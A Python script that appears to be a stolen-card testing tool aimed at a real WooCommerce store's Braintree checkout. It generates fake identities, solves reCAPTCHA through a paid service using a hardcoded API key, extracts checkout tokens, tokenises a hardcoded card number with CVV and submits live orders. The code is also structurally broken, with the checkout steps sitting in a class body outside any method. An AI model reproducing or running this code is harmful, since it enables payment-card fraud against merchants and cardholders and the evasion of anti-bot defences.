import base64
import requests
import random
import json
import names
from random_address import real_random_address
from bs4 import BeautifulSoup
import uuid
import time
from fake_useragent import UserAgent


direc = real_random_address()

api_key = '2386a15d92d40951731525d290043436'

def capsolver(site_key,site_url,type):
    payload = {
        "clientKey": api_key,
        "task": {
            "type": type,
            "websiteKey": site_key,
            "websiteURL": site_url
        }
    }
    res = requests.post("https://api.capsolver.com/createTask", json=payload)
    resp = res.json()
    task_id = resp.get("taskId")
    if not task_id:
        print("Failed to create task:", res.text)
        return

    while True:
        time.sleep(3)  # delay
        payload = {"clientKey": api_key, "taskId": task_id}
        res = requests.post("https://api.capsolver.com/getTaskResult", json=payload)
        resp = res.json()
        status = resp.get("status")
        if status == "ready":
            return resp.get("solution", {}).get('gRecaptchaResponse')
        if status == "failed" or resp.get("errorId"):
            return

def generar_codigo_session():
    codigo_session = str(uuid.uuid4())
    return codigo_session


def find_between(data, first, last):
  try:
    start = data.index( first ) + len( first )
    end = data.index( last, start )
    return data[start:end]
  except ValueError:
    return None  

zipcode = direc['postalCode']
try:
    city = direc['city']
except KeyError:
    city = 'NY'
state = direc['state']
street = direc['address1']

class americanairlessonline:
    def __init__(self, tarjeta):
        partes = tarjeta.split("|")
        
        self.tarjeta = tarjeta
        if len(partes) == 4:
            self.cc = partes[0]
            self.mes = partes[1]
            self.ano = partes[2]
            self.cvv = partes[3]
        self.username = f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}"
        self.CorreoRand = f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}@gmail.com"
        self.Password = f"{names.get_first_name()}{names.get_last_name()}#{random.randint(1000000,9999999)}"
        
        
        
    def detectar_tipo_tarjeta(self):
        if self.cc.startswith("4"):
            return "Visa"
        elif self.cc.startswith("5"):
            return "MasterCard"
        elif self.cc.startswith("3"):
            return "American Express"
        elif self.cc.startswith("6"):
            return "Discover"
        else:
            return "Desconocido"




    Agent = UserAgent().random
    session = requests.Session()
    guid = str(uuid.uuid4()).replace('-', '') + 'f532e2'
    muid = str(uuid.uuid4()).replace('-', '') + 'f532e2'
    sid = str(uuid.uuid4()).replace('-', '') + '438b7a'

    CorreoRand = f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}@gmail.com"
    headers = {
        'accept': '*/*',
        'accept-language': 'es-ES,es;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://exteriorcoatings.com',
        'priority': 'u=1, i',
        'referer': 'https://exteriorcoatings.com/product/wooster-18-big-ben-roller-frame/',
        'user-agent': Agent,
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'attribute_pa_size': '18-roller-frame',
        'quantity': '1',
        'gtm4wp_product_data': '{"internal_id":10959,"item_id":10959,"item_name":"18\\" Wooster Big Ben Roller Frame For Quick Application of Floor Coatings","sku":10959,"price":35,"stocklevel":null,"stockstatus":"instock","google_business_vertical":"retail","item_category":"Applicators","id":10959}',
        'add-to-cart': '10959',
        'product_id': '10959',
        'variation_id': '10960',
        'action': 'etheme_ajax_add_to_cart',
    }

    response = session.post('https://exteriorcoatings.com/wp-admin/admin-ajax.php',  headers=headers, data=data)
    
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'accept-language': 'es-ES,es;q=0.7',
        'priority': 'u=0, i',
        'referer': 'https://exteriorcoatings.com/product/wooster-18-big-ben-roller-frame/',
        'upgrade-insecure-requests': '1',
        'user-agent': Agent,
    }

    response = session.get('https://exteriorcoatings.com/cart/', headers=headers).text

    
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'accept-language': 'es-ES,es;q=0.7',
        'priority': 'u=0, i',
        'referer': 'https://exteriorcoatings.com/cart/',
        'upgrade-insecure-requests': '1',
        'user-agent': Agent,
    }

    response = session.get('https://exteriorcoatings.com/checkout/',  headers=headers).text
    url = 'https://exteriorcoatings.com/checkout/'
    key_url = '6Lc_yZEqAAAAAG3Nj52zbsGAZEMQ-d9s0oMb1xEy'
    tipo = 'ReCaptchaV2TaskProxyLess'

    cap = capsolver(key_url, url, tipo)
    print(cap)

    check = find_between(response, 'name="woocommerce-process-checkout-nonce" value="', '"')
    eyj2 = find_between(response, 'wc_braintree_client_token = ["', '"];')
    decode = base64.b64decode(eyj2)
    decode_string = decode.decode("utf-8")
    
    json_data = json.loads(decode_string)   
    
    bearer = json_data.get('authorizationFingerprint')
    print(bearer)
    print(check)
    

    
    headers = {
        'accept': '*/*',
        'accept-language': 'es-ES,es;q=0.7',
        'authorization': f'Bearer {bearer}',
        'braintree-version': '2018-05-10',
        'content-type': 'application/json',
        'origin': 'https://assets.braintreegateway.com',
        'priority': 'u=1, i',
        'referer': 'https://assets.braintreegateway.com/',
        'user-agent': Agent,
    }

    json_data = {
        'clientSdkMetadata': {
            'source': 'client',
            'integration': 'custom',
            'sessionId': str(uuid.uuid4()),
        },
        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId         business         consumer         purchase         corporate       }     }   } }',
        'variables': {
            'input': {
                'creditCard': {
                    'number': '4341889184140099',
                    'expirationMonth': '10',
                    'expirationYear': '2030',
                    'cvv': '269',
                    'billingAddress': {
                        'postalCode': '10080',
                        'streetAddress': 'moall del sol',
                    },
                },
                'options': {
                    'validate': False,
                },
            },
        },
        'operationName': 'TokenizeCreditCard',
    }

    response = session.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data).json()
    token_id = response['data']['tokenizeCreditCard']['token']
    print(token_id)
    

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'es-ES,es;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://exteriorcoatings.com',
        'priority': 'u=1, i',
        'referer': 'https://exteriorcoatings.com/checkout/',
        'user-agent': Agent,
        'x-requested-with': 'XMLHttpRequest',
    }

    params = {
        'wc-ajax': 'checkout',
    }

    data = f'wc_order_attribution_source_type=typein&wc_order_attribution_referrer=(none)&wc_order_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=(direct)&wc_order_attribution_utm_medium=(none)&wc_order_attribution_utm_content=(none)&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_utm_source_platform=(none)&wc_order_attribution_utm_creative_format=(none)&wc_order_attribution_utm_marketing_tactic=(none)&wc_order_attribution_session_entry=https%3A%2F%2Fexteriorcoatings.com%2Fproduct%2Fe903m-urethane-cement-mortar-high-wet-heat-200f-hot-oil-water-wash-fungi-resistant%2F&wc_order_attribution_session_start_time=2026-03-05+17%3A34%3A27&wc_order_attribution_session_pages=9&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F145.0.0.0+Safari%2F537.36&billing_first_name=ldfl&billing_last_name=dsdasd&billing_company=ggd&billing_country=US&billing_address_1=moall+del+sol&billing_address_2=sadw&billing_city=guayas&billing_state=NY&billing_postcode=10080&billing_phone=%2B10989861371&billing_email=banes42563%40rohoza.com&shipping_first_name=ldfl&shipping_last_name=dsdasd&shipping_company=ggd&shipping_country=US&shipping_address_1=moall+del+sol&shipping_address_2=sadw&shipping_city=guayas&shipping_state=NY&shipping_postcode=10080&order_comments=&shipping_method%5B0%5D=advanced_free_shipping&payment_method=braintree_cc&braintree_cc_nonce_key={token_id}&braintree_cc_device_data=&braintree_cc_3ds_nonce_key=&braintree_cc_config_data=%7B%22environment%22%3A%22production%22%2C%22clientApiUrl%22%3A%22https%3A%2F%2Fapi.braintreegateway.com%3A443%2Fmerchants%2Fmzh5dqj825mpfy69%2Fclient_api%22%2C%22assetsUrl%22%3A%22https%3A%2F%2Fassets.braintreegateway.com%22%2C%22analytics%22%3A%7B%22url%22%3A%22https%3A%2F%2Fclient-analytics.braintreegateway.com%2Fmzh5dqj825mpfy69%22%7D%2C%22merchantId%22%3A%22mzh5dqj825mpfy69%22%2C%22venmo%22%3A%22off%22%2C%22graphQL%22%3A%7B%22url%22%3A%22https%3A%2F%2Fpayments.braintree-api.com%2Fgraphql%22%2C%22features%22%3A%5B%22tokenize_credit_cards%22%5D%7D%2C%22fastlane%22%3A%7B%22enabled%22%3Atrue%2C%22tokensOnDemand%22%3Anull%7D%2C%22challenges%22%3A%5B%22cvv%22%2C%22postal_code%22%5D%2C%22creditCards%22%3A%7B%22supportedCardTypes%22%3A%5B%22Discover%22%2C%22MasterCard%22%2C%22Visa%22%2C%22American+Express%22%2C%22UnionPay%22%5D%7D%2C%22threeDSecureEnabled%22%3Afalse%2C%22threeDSecure%22%3Anull%2C%22androidPay%22%3A%7B%22displayName%22%3A%22Exterior+Performance+Coatings%2C+Inc%22%2C%22enabled%22%3Atrue%2C%22environment%22%3A%22production%22%2C%22googleAuthorizationFingerprint%22%3A%22eyJraWQiOiIyMDE4MDQyNjE2LXByb2R1Y3Rpb24iLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsImFsZyI6IkVTMjU2In0.eyJleHAiOjE3NzI5OTE5NjksImp0aSI6IjJmZTBlZjVhLWQwNjAtNGMzNC1hMTY3LWJlMGMyZWRkYWI0MiIsInN1YiI6Im16aDVkcWo4MjVtcGZ5NjkiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Im16aDVkcWo4MjVtcGZ5NjkiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlLCJ2ZXJpZnlfd2FsbGV0X2J5X2RlZmF1bHQiOmZhbHNlfSwicmlnaHRzIjpbInRva2VuaXplX2FuZHJvaWRfcGF5Il0sIm9wdGlvbnMiOnt9fQ.7-0863ZZwfvyQ89c53mGFhGoyjRgNyaITUX7FlpjpRcW5ZFUXvsEBkb4fUhrzUUXRRqRTooEICxwNOPk0Pr1fg%22%2C%22paypalClientId%22%3A%22AY4x64CGuDuFW4FgQnRL9rU38pYeUiH3-apQJJ2yu-TDkB5RERG8Jvs1uDRQbVad-ufRGILucE4BsNOD%22%2C%22supportedNetworks%22%3A%5B%22amex%22%5D%7D%2C%22paypalEnabled%22%3Atrue%2C%22paypal%22%3A%7B%22displayName%22%3A%22Exterior+Performance+Coatings%2C+Inc%22%2C%22clientId%22%3A%22AY4x64CGuDuFW4FgQnRL9rU38pYeUiH3-apQJJ2yu-TDkB5RERG8Jvs1uDRQbVad-ufRGILucE4BsNOD%22%2C%22assetsUrl%22%3A%22https%3A%2F%2Fcheckout.paypal.com%22%2C%22environment%22%3A%22live%22%2C%22environmentNoNetwork%22%3Afalse%2C%22unvettedMerchant%22%3Afalse%2C%22braintreeClientId%22%3A%22ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW%22%2C%22billingAgreementsEnabled%22%3Atrue%2C%22merchantAccountId%22%3A%22georgeexteriorperformancecoatingscom%22%2C%22payeeEmail%22%3Anull%2C%22currencyIsoCode%22%3A%22USD%22%7D%7D&braintree_paypal_nonce_key=&braintree_paypal_device_data=&g-recaptcha-response={cap}&woocommerce-process-checkout-nonce={check}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review'

    response = session.post('https://exteriorcoatings.com/', params=params,  headers=headers, data=data).text
    print(response)
